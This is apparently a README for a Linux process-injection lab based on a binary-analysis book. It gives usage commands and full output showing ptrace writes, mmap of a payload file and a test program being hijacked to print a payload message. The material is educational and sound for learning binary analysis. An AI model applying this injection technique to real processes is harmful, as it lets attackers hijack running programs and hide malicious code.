Program to inject code into running process.
From Learning Linux Binary Analysis Chapter 3 by Ryan "Elfmaster" O'Neill

Usage:
./helloop
sudo ./proc_inject `pidof helloop` payload

Resourses:
https://github.com/elfmaster/packt_book/blob/master/code_inject.c
http://vxer.org/lib/vrn00.html


Output:

bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/hijack-process $ sudo ./proc_inject `pidof helloop` payload
[sudo] password for bob: 
read: 0x0000000000600e28
read: 0x00007f347c1e9168
read: 0x00007f347bfd9870
path: payload
write addr: 0x601000 val: 70
write addr: 0x601001 val: 61
write addr: 0x601002 val: 79
write addr: 0x601003 val: 6c
write addr: 0x601004 val: 6f
write addr: 0x601005 val: 61
write addr: 0x601006 val: 64
read: 0x002f7ba80d8b48c3
read: 0xc88348018964d8f7
read: 0x0000441f0f66c3ff
read: 0x7500002fd4593d83
read: 0x050f00000023b810
reading 40 bytes of data

c3 48 8b 0d a8 7b 2f 00 f7 d8 64 89 01 48 83 c8 ff c3 66 0f 
1f 44 00 00 83 3d 59 d4 2f 00 00 75 10 b8 23 00 00 00 0f 05 
sysenter: 7f347bcc42f0
rdi: 601000
rdx: 0
rsi: 0
rax: 23
rip: 7f347bcc42ee
rdi: 601000
rdx: 0
rsi: 0
rip: 7f347bcc42f0
r8: 0
rax: 3
writing back original data segment.
write addr: 0x601000 val: 600e28
write addr: 0x601008 val: 7f347c1e9168
write addr: 0x601010 val: 7f347bfd9870
rdi: 0
rdx: 7
rsi: 2000
rax: 23
rip: 7f347bcc42ee
rdi: 0
rdx: 7
rsi: 2000
rip: 7f347bcc42f0
r8: 3
rax: 7f347c1e3000
mmap: Success
evil code at 7f347c1e3000
attempting to run it...
Success!

********************************************************************************

bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/hijack-process $ ./helloop
hello 0
hello 1
hello 2
hello 3
hello 4
hello 5
hello 6
hello 7
hello 8
hello 9
hello 10
hello 11
hello 12
hello 13
hello 14
hello 15
hello 16
hello 17
hello 18
hello 19
hello 20
hello 21
hello 22
hello 23
hello 24
hello 25
hello 26
hello 27
hello 28
hello 29
hello 30
I am the payload who has hijacked your process!
bob@bob-ThinkPad-X1-Carbon-3rd ~/Pen/hijack-process $


